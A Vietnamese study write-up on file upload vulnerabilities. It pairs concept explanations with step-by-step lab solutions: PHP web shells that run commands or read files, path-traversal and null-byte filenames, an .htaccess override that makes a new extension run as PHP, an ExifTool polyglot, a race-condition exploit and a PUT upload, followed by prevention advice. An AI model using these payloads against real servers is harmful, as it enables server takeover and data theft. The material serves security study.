# Tìm hiểu về File Upload
- Người thực hiện: Lê Thị Mỹ Tiên
- Cập nhật lần cuối
# Mục lục
# Nội dung
## 1. Tìm kiếm các chức năng Upload:
### 1.1 Khái niệm - tác động:
- Đây là lỗ hổng xảy ra khi máy chủ web cho phép người dùng tải tệp lên nhưng không kiểm soát đầy đủ các thuộc tính của tệp (tên, loại, nội dung, kích thước).
- Tùy thuộc vào mức độ kiểm soát mà hệ thống thực hiện, hậu quả có thể khác nhau:
  + **Thực thi mã từ xa (nguy hiểm nhất)**: Nếu hệ thống không kiểm tra loại file và cho phép upload file có thể chạy trên server (`.php`, `.jsp`, `.asp`…), hacker có thể triển khai web shell → chiếm quyền toàn bộ máy chủ.
  + **Ghi đè hoặc thay thế file quan trọng**: Nếu không kiểm tra tên file, attacker có thể upload một file trùng tên với file hệ thống hoặc ứng dụng → ghi đè file gốc → phá hoại hoặc chiếm quyền.
  + **Chiếm quyền truy cập thư mục bất ngờ**: Nếu hệ thống kết hợp với lỗ hổng duyệt thư mục (directory traversal), kẻ tấn công có thể đưa file vào thư mục quan trọng mà quản trị không lường trước.
  + **Tấn công từ chối dịch vụ (DoS)**: Nếu không giới hạn dung lượng file, hacker có thể upload file cực lớn → làm đầy ổ đĩa, khiến hệ thống ngưng hoạt động.
### 1.2 Lỗ hổng File Upload cách phát sinh:
Lỗ hổng File Upload phát sinh chủ yếu do việc kiểm soát không toàn diện hoặc không chặt chẽ: dựa vào blacklist, xác minh thuộc tính dễ bị giả mạo, hoặc triển khai không đồng nhất → tạo ra “lỗ hổng” cho attacker lợi dụng để tải file nguy hiểm.
### 1.3 Máy chủ web xử lý các yêu cầu về tệp tĩnh
- **Cơ chế cơ bản**:
Khi có một yêu cầu HTTP, máy chủ sẽ phân tích đường dẫn (URL) để xác định phần mở rộng tệp → Sau đó, so sánh phần mở rộng này với danh sách ánh xạ MIME (MIME type mapping) đã được cấu hình sẵn → tùy theo loại tệp, máy chủ sẽ quyết định cách xử lý tiếp theo.
- Các tình huống:
  + **Tệp tĩnh không thực thi (ảnh, CSS, HTML thuần)**: Máy chủ đọc nội dung file và trả về cho client trong phản hồi HTTP.
  + **Tệp có thể thực thi (ví dụ PHP, JSP, ASP) và máy chủ hỗ trợ**: Máy chủ gán biến từ tham số HTTP → chạy file script → gửi kết quả đầu ra (HTML, JSON, v.v.) về cho client. 👉 Đây chính là cơ chế khiến việc upload file script có thể dẫn đến Remote Code Execution.
  + **Tệp có thể thực thi nhưng máy chủ không hỗ trợ**: Thông thường: máy chủ trả về lỗi. Nếu cấu hình sai: máy chủ có thể trả lại nội dung mã nguồn dưới dạng text → gây rò rỉ thông tin nhạy cảm (source code disclosure).

----

## 2. Kỹ thuật Upload Backdoor:
### 2.1 Khai thác việc tải tệp không giới hạn để triển khai shell web
Ví dụ:
- Dòng lệnh PHP sau đây có thể được sử dụng để đọc các tệp tùy ý từ hệ thống tệp của máy chủ:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

- Một web shell linh hoạt hơn có thể trông giống như thế này:

`<?php echo system($_GET['command']); ?>`

- Tập lệnh này cho phép bạn truyền lệnh hệ thống tùy ý thông qua tham số truy vấn như sau:

`GET /example/exploit.php?command=id HTTP/1.1`

📘 **LAB 1: THỰC THI MÃ TỪ XA THÔNG QUA TẢI LÊN WEB SHELL**

Tải lên một web shell PHP cơ bản và sử dụng nó để trích xuất nội dung của tệp `/home/carlos/secret`

Bước 1: Upload ảnh → xác nhận hiển thị → lọc lịch sử Burp theo MIME Image → tìm request GET đến file ảnh → gửi sang Repeater.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/71b5963b-0370-402c-b3d4-1400551e39bc" />
Bước 2: Tạo một tệp có tên là `exploit.php`, chứa một tập lệnh để lấy nội dung tệp bí mật của Carlos. 

`<?php echo file_get_contents('/home/carlos/secret'); ?>` 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0b07dd96-4ca1-4896-8f4d-86421bbaebb5" />
Thông báo trong phản hồi xác nhận rằng tệp này đã được tải lên thành công.

Bước 3: Trong Burp Repeater, hãy thay đổi đường dẫn của yêu cầu để trỏ đến tệp PHP: 

`GET /files/avatars/exploit.php HTTP/1.1`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d6bb3d30-3347-465a-a0bd-d5bcf849693b" />
Kết quả đầu ra: `1eCueh5dOL56ir9XPaW2KZgyc1GLbF9e`
### 2.2 Khai thác lỗi xác thực khi tải tệp lên
#### 2.2.1 Xác thực loại tệp bị lỗi
Các website thường có cơ chế chặn tệp độc hại, nhưng nhiều khi chỉ kiểm tra **Content-Type** trong phần upload. Vì tiêu đề này dễ bị giả mạo, kẻ tấn công có thể gửi file script độc hại nhưng gắn nhãn MIME như hình ảnh (`image/jpeg`). Nếu máy chủ không xác minh nội dung thực, webshell có thể được tải lên và thực thi, dẫn đến chiếm quyền điều khiển.

📘 **LAB 2: TẢI LÊN WEB SHELL BẰNG CÁCH VƯỢT QUA HẠN CHẾ CONTENT-TYPE**

Bước 1: Tạo một tệp có tên là exploit.php, chứa một tập lệnh để lấy nội dung bí mật của Carlos.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c0c6e4c7-4a8b-48a3-9c76-12cb96ae3446" />
Phản hồi cho biết bạn chỉ được phép tải lên các tệp có định dạng MIME `image/jpeg` hoặc `image/png`.

Bước 2:Trong phần nội dung tin nhắn liên quan đến tệp, hãy thay đổi giá trị được chỉ định Content-Type thành `image/jpeg`.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1c8fba88-e2e3-4fc3-84c6-912b65b23d31" />
Phản hồi cho biết tệp đã được tải lên thành công.

Bước 3: Chuyển sang tab Repeater khác chứa `GET /files/avatars/<YOUR-IMAGE>`. Trong đường dẫn, hãy thay thế tên tệp hình ảnh bằng `exploit.php` và gửi yêu cầu.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7e63a558-97c2-4c30-be0c-00f3654a1024" />
#### 2.2.2 Ngăn chặn việc thực thi tệp trong các thư mục mà người dùng có thể truy cập
Máy chủ thường ngăn chặn việc tải lên các tệp nguy hiểm ngay từ đầu và chỉ thực thi những tập lệnh có kiểu MIME hợp lệ. Nếu không, hệ thống sẽ trả về lỗi hoặc hiển thị nội dung tệp dưới dạng văn bản, điều này có thể làm lộ mã nguồn nhưng không cho phép tạo web shell. Cấu hình bảo mật thường khác nhau giữa các thư mục: thư mục cho phép người dùng tải lên thường kiểm soát chặt chẽ hơn, trong khi các thư mục khác có thể ít hạn chế hơn và dễ bị khai thác để thực thi mã. Ngoài ra, do hạ tầng thường sử dụng proxy ngược hoặc cân bằng tải, yêu cầu có thể được xử lý bởi nhiều máy chủ nền với cấu hình khác nhau, tạo thêm khả năng phát sinh lỗ hổng.

📘 **LAB 3: TẢI LÊN SHELL WEB THÔNG QUA ĐƯỜNG DẪN**

Bước 1: Trong Burp Repeater, hãy chuyển đến tab chứa `POST /my-account/avatar` và tìm phần nội dung yêu cầu liên quan đến tệp PHP. Trong `Content-Disposition`, hãy thay đổi filename thành `filename="../exploit.php"` để bao gồm trình tự duyệt thư mục:
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/197a4886-f212-4cf4-aa5b-6838d4504e89" />
**Phản hồi cho biết `The file avatars/exploit.php has been uploaded`**

Bước 2: Làm tối nghĩa trình tự duyệt thư mục bằng cách mã hóa URL /ký tự dấu gạch chéo ( ) bằng: `filename="..%2fexploit.php"`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7e78af64-ab82-4d66-8237-c72841cb0d27" />
**Thông báo hiện ra rằng `The file avatars/../exploit.php has been uploaded`.Điều này cho biết tên tệp đang được máy chủ giải mã URL**

Bước 3:Trong lịch sử proxy của Burp, hãy tìm `GET /files/avatars/..%2fexploit.php` Lưu ý rằng bí mật của Carlos đã được trả về trong phản hồi. Điều này cho thấy tệp đã được tải lên thư mục cao hơn trong hệ thống phân cấp tệp `(/files)` và sau đó được máy chủ thực thi
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7906f839-1412-499f-b5b9-77f97fa54dca" />
Bước 4: Sử dụng `GET /files/exploit.php`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b33fcd52-d9e7-48c3-83e2-71846cbc647f" />

#### 2.2.3 Danh sách đen các loại tệp nguy hiểm không đầy đủ
**Ghi đè cấu hình máy chủ**

Máy chủ web chỉ thực thi tập lệnh khi được cấu hình, chẳng hạn như Apache cần khai báo trong `apache2.conf` hoặc dùng tệp `.htaccess`, còn IIS dùng `web.config`. Các tệp cấu hình này cho phép thay đổi cách xử lý MIME hoặc quyền thực thi trong từng thư mục. Thông thường chúng không thể truy cập qua HTTP, nhưng nếu kẻ tấn công tải lên được tệp cấu hình độc hại, họ có thể ghi đè thiết lập bảo mật và ánh xạ phần mở rộng bất kỳ thành MIME thực thi, từ đó bỏ qua danh sách đen và chạy mã trái phép.

📘 **LAB 4: TẢI LÊN SHELL WEB THÔNG QUA TIỆN ÍCH MỞ RỘNG BỎ QUA DANH SÁCH ĐEN**
Bước 1: Tải tệp `exploit.php` làm ảnh đại diện. Phản hồi cho biết bạn không được phép tải lên các tệp có phần mở rộng `.php`. 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a3514f57-7569-4772-b40b-aaffdc923af9" />
Bước 2: Trong Burp Repeater, hãy chuyển đến tab `POST /my-account/avatar` và tìm phần nội dung liên quan đến tệp PHP. Thực hiện các thay đổi sau:
- Thay đổi giá trị của `filename` thành `.htaccess`.
- Thay đổi giá trị của `Content-Type` thành `text/plain`.
- Thay thế nội dung của tệp bằng lệnh Apache sau: `AddType application/x-httpd-php .l33t`

Thao tác này ánh xạ một phần mở rộng tùy ý ( .l33t) đến kiểu MIME thực thi `application/x-httpd-php`. Khi máy chủ sử dụng mod_php, nó đã biết cách xử lý việc này.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0683b140-d33e-460a-8741-fe263ac2136e" />
**Thông báo cho thấy tệp đã được tải lên thành công**

Bước 4: Sử dụng mũi tên quay lại trong Burp Repeater để quay lại yêu cầu ban đầu để tải lên mã khai thác PHP. Thay đổi giá trị của filename từ `exploit.php` thành `exploit.l33t`.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/49d1d21b-501c-412b-b6d5-6fad6b1dbade" />
**Gửi lại yêu cầu và lưu ý rằng tệp đã được tải lên thành công.**

Bước 4: Chuyển sang tab `/files/avatars/`. Trong đường dẫn, hãy thay thế tên tệp hình ảnh bằng `exploit.l33t`và gửi yêu cầu.  
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0ef20c73-a016-4ae6-8794-7460698f278a" />
Nhờ tệp độc hại `.htaccess` , `.l33t`đã được thực thi như thể nó là một `.php`.

**Làm mờ phần mở rộng tệp**

Đây là bản tóm tắt nội dung trên thành văn ngắn gọn:

Kẻ tấn công có thể vượt qua danh sách đen kiểm tra phần mở rộng tệp bằng nhiều kỹ thuật làm mờ. Ví dụ: lợi dụng phân biệt chữ hoa chữ thường (`exploit.pHp`), dùng nhiều phần mở rộng (`exploit.php.jpg`), thêm ký tự thừa ở cuối (`exploit.php.`), hoặc mã hóa URL dấu chấm và ký tự đặc biệt (`exploit%2Ephp`). Ngoài ra, có thể chèn dấu chấm phẩy, byte rỗng (`exploit.asp;.jpg`, `exploit.asp%00.jpg`), dùng ký tự Unicode đa byte để đánh lừa cách phân tích cú pháp, hoặc lợi dụng việc hệ thống loại bỏ chuỗi cấm không đệ quy (`exploit.p.phphp`). Những kỹ thuật này cho phép tệp độc hại lọt qua xác thực và có thể được máy chủ thực thi.

📘 **LAB 5: TẢI LÊN SHELL WEB THÔNG QUA PHẦN MỞ RỘNG TỆP BỊ LÀM MỜ**

Bước 1: Trong `Content-Disposition`, hãy thay đổi giá trị của filename để bao gồm một byte null được mã hóa theo URL, theo sau là `.jpg`: `filename="exploit.php%00.jpg"`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cbb5efaa-079a-4f52-bb10-8960cfb196f0" />
Gửi yêu cầu và quan sát thấy tệp đã được tải lên thành công. Lưu ý rằng thông báo đề cập đến tệp là `exploit.php`, cho thấy byte null và `.jpg` đã bị xóa.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9d4e4840-c2c5-4681-9596-5b7a10e1e58a" />

#### 2.2.4 Xác thực nội dung tệp lỗi
* Máy chủ an toàn không chỉ dựa vào **Content-Type** trong yêu cầu mà còn kiểm tra nội dung thực tế của tệp.
* Với ảnh, có thể kiểm tra thuộc tính nội tại như **kích thước**; nếu không có, tệp sẽ bị từ chối.
* Một số định dạng có **chữ ký byte cố định** (ví dụ JPEG bắt đầu bằng `FF D8 FF`) để xác minh tính hợp lệ.
* Đây là cách xác thực mạnh hơn, nhưng vẫn có thể bị bypass, ví dụ bằng cách tạo **tệp JPEG hợp lệ chứa mã độc trong metadata** với công cụ như **ExifTool**.

📘 **LAB 6: THƯC THI MÃ TỪ XA THÔNG QUA TẢI LÊN SHELL WEB ĐA NGÔN NGỮ**
Bước 1: Tạo một tệp PHP/JPG đa ngôn ngữ, về cơ bản là một hình ảnh bình thường, nhưng chứa dữ liệu PHP trong siêu dữ liệu. Một cách đơn giản để thực hiện việc này là tải xuống và chạy ExifTool từ dòng lệnh như sau:
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" Picture1.png  -o polyglot.php` 
<img width="1920" height="238" alt="image" src="https://github.com/user-attachments/assets/c4d1e237-f596-4a2e-841e-3d017e8b952f" />
Thao tác này sẽ thêm đoạn mã PHP vào trường hình ảnh Comment, sau đó lưu hình ảnh với `.php`.
Bước 2:Trong trình duyệt, hãy tải hình ảnh đa ngôn ngữ lên làm ảnh đại diện, sau đó quay lại trang tài khoản 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ee84d458-2766-4412-8785-6f0e7534970d" />
Bước 3: Trong lịch sử proxy của Burp, hãy tìm `GET /files/avatars/polyglot.php`. Sử dụng tính năng tìm kiếm của trình soạn thảo tin nhắn để tìm chuỗi ở đâu đó trong dữ liệu ảnh nhị phân trong phản hồi.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/90ad2874-ec82-493d-bdb1-ccf6be76c844" />

#### 2.2.5 Khai thác điều kiện tranh chấp trong tính năng tải tệp lên
* **Hệ thống hiện đại** thường an toàn hơn: lưu file vào thư mục tạm, đặt tên ngẫu nhiên, kiểm tra trước khi chuyển sang vị trí chính thức.
* **Tự viết quy trình upload** dễ dẫn đến lỗi: nếu làm chưa tốt có thể xuất hiện race condition (điều kiện chạy đua).
* **Ví dụ lỗ hổng**: trang web lưu file trực tiếp vào hệ thống, rồi sau đó mới chạy kiểm tra (diệt virus, validate). Nếu file không hợp lệ thì xóa. Trong vài mili-giây tồn tại, kẻ tấn công có thể truy cập và thực thi file.
* **Đặc điểm**: lỗi này tinh vi, khó phát hiện bằng kiểm thử hộp đen, trừ khi có thể phân tích được mã nguồn.

📘 **LAB 7: TẢI LÊN SHELL WEB THÔNG QUA ĐIỀU KIỆN CHẠY ĐUA**

Bước 1: Sử dụng Turbo Intruder. Nhấp chuột phải vào `POST /my-account/avatar` để gửi tệp tải lên và chọn Tiện ích mở rộng > Turbo Intruder > Gửi đến Turbo Intruder 

Bước 2: Trong tập lệnh, hãy thay thế `<YOUR-POST-REQUEST>` bằng toàn bộ `POST /my-account/avatar` chứa `exploit.php`.Thay thế `<YOUR-GET-REQUEST>` bằng yêu cầu GET tải tệp PHP đã tải lên, sau đó đổi tên tệp trong đường dẫn thành exploit.php
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cd242011-9bf8-4415-ab06-c93495a71161" /> 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c75ae68c-e4a4-4da7-9b87-856848d66afd" />
Bước 3: Trong danh sách kết quả, lưu ý rằng một số GET nhận được phản hồi 200 chứa bí mật của Carlos. Những yêu cầu này đã đến máy chủ sau khi tệp PHP được tải lên, nhưng trước khi tệp không được xác thực và bị xóa.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/664246ee-6a48-4bbc-872f-836e3ae4e0ba" />

----

## 3. Upload Backdoor nâng cao:
### 3.1 Khai thác lỗ hổng tải tệp lên mà không cần thực thi mã từ xa
* **Tải lên tập lệnh phía máy chủ**: Nguy hiểm nhất, vì cho phép thực thi mã từ xa (RCE).
* **Tải lên tập lệnh độc hại phía máy khách**:
  * Dù không thực thi được trên máy chủ, nhưng có thể chèn mã XSS nếu tải lên các file như HTML, SVG có chứa thẻ `<script>`.
  * Khi người dùng khác truy cập trang hiển thị file này, trình duyệt sẽ thực thi mã độc.
  * Hạn chế: chỉ hoạt động nếu file được phục vụ từ cùng nguồn gốc (same-origin).
* **Khai thác lỗ hổng trong xử lý tệp tải lên**:
  * Nếu file được lưu trữ “an toàn”, vẫn có thể tấn công qua lỗi trong trình phân tích cú pháp.
  * Ví dụ: khai thác XXE trong các định dạng dựa trên XML (như DOCX, XLSX).

### 3.2 Tải tệp lên bằng PUT
Một số máy chủ web có thể được cấu hình để hỗ trợ **PUT** requests.  
Nếu không có biện pháp phòng vệ phù hợp, điều này có thể cung cấp một phương thức thay thế để tải lên các tệp độc hại, ngay cả khi chức năng tải lên không khả dụng qua giao diện web.

**Ví dụ minh họa**:

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
````

---

## 4. Cách phòng ngừa:
Việc cho phép người dùng tải tệp lên là bình thường, nhưng cần có biện pháp phòng ngừa để tránh lỗ hổng bảo mật. Các nguyên tắc chính gồm:

* Chỉ cho phép tải lên những phần mở rộng tệp trong **danh sách trắng**.
* Kiểm tra tên tệp, tránh chuỗi gây duyệt thư mục (như `../`).
* **Đổi tên** tệp sau khi tải để tránh ghi đè.
* Chỉ lưu tệp lên hệ thống sau khi **xác thực đầy đủ**.
* Ưu tiên sử dụng **framework có sẵn** thay vì tự xây dựng cơ chế xác thực.





